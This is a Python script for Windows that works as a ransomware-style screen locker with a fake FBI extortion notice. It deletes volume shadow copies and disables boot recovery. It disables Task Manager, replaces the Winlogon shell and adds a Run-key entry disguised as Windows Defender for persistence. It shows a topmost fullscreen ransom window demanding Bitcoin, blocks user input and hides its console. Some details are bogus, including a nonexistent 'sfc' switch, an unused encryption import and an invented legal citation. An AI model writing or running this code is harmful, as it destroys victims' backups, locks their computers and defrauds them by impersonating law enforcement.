import os
import sys
import ctypes
import win32api
import win32con
import win32gui
import win32security
import tempfile
import subprocess
from cryptography.fernet import Fernet
from PIL import Image, ImageDraw, ImageFont
import base64

# Disable Windows error reporting and system protection
os.system("sfc /scannow-disable")
subprocess.run(["wmic", "shadowcopy", "delete"], capture_output=True)

# Maximum privilege escalation
try:
    privilege = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
    token_handle = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32security.TOKEN_ALL_ACCESS)
    win32security.AdjustTokenPrivileges(token_handle, False, [(privilege, win32security.SE_PRIVILEGE_ENABLED)])
except: pass

# Create ransom screen image
img = Image.new('RGB', (1920, 1080), color='black')
draw = ImageDraw.Draw(img)
font = ImageFont.load_default()

# Fake law enforcement message
message = """OFFICIAL NOTICE - SYSTEM LOCKED

Your system has been locked due to violation of:
• Article 17-C of Digital Millennium Copyright Act
• Section 291-3 of Computer Fraud and Abuse Act
• Multiple illegal content distributions

To unlock your system and avoid legal proceedings:
Payment Required: $500 in Bitcoin
Send to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
Contact: fbi-recovery@protonmail.com

DO NOT ATTEMPT TO BYPASS - SYSTEM MONITORING ACTIVE"""

draw.text((100, 200), message, fill='red', font=font)
img.save("C:\\Windows\\System32\\ransom_screen.png")

# Create persistent registry entries
registry_payloads = [
    ["HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", "1"],
    ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Shell", "cmd.exe"],
    ["HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "WindowsDefender", sys.argv[0]]
]

for reg in registry_payloads:
    try:
        subprocess.run(f"reg add {reg[0]} /v {reg[1]} /t REG_SZ /d {reg[2]} /f", shell=True)
    except: pass

# Fullscreen lock window
class RansomWindow:
    def __init__(self):
        self.hwnd = None
        self.create_window()
    
    def create_window(self):
        wc = win32gui.WNDCLASS()
        wc.lpfnWndProc = self.wnd_proc
        wc.lpszClassName = "RansomLock"
        wc.hbrBackground = win32con.COLOR_WINDOW
        class_atom = win32gui.RegisterClass(wc)
        
        self.hwnd = win32gui.CreateWindowEx(
            win32con.WS_EX_TOPMOST | win32con.WS_EX_TOOLWINDOW,
            class_atom,
            "SYSTEM LOCKED - FBI NOTICE",
            win32con.WS_POPUP | win32con.WS_VISIBLE,
            0, 0,
            win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1),
            0, 0, 0, None
        )
        
        win32gui.SetWindowLong(self.hwnd, win32con.GWL_STYLE, 0)
        win32gui.ShowWindow(self.hwnd, win32con.SW_MAXIMIZE)
        
    def wnd_proc(self, hwnd, msg, wParam, lParam):
        if msg == win32con.WM_KEYDOWN:
            if wParam in [win32con.VK_F4, win32con.VK_F8, win32con.VK_F11, win32con.VK_ESCAPE]:
                return 0
        return win32gui.DefWindowProc(hwnd, msg, wParam, lParam)

# Disable system recovery
subprocess.run("vssadmin delete shadows /all /quiet", shell=True)
subprocess.run("bcdedit /set {default} recoveryenabled no", shell=True)

# Main execution
if __name__ == "__main__":
    # Hide console window
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # Create ransom window
    ransom = RansomWindow()
    
    # Block user input
    ctypes.windll.user32.BlockInput(True)
    
    # Keep process running
    while True:
        win32gui.PumpMessages()
        win32api.Sleep(100)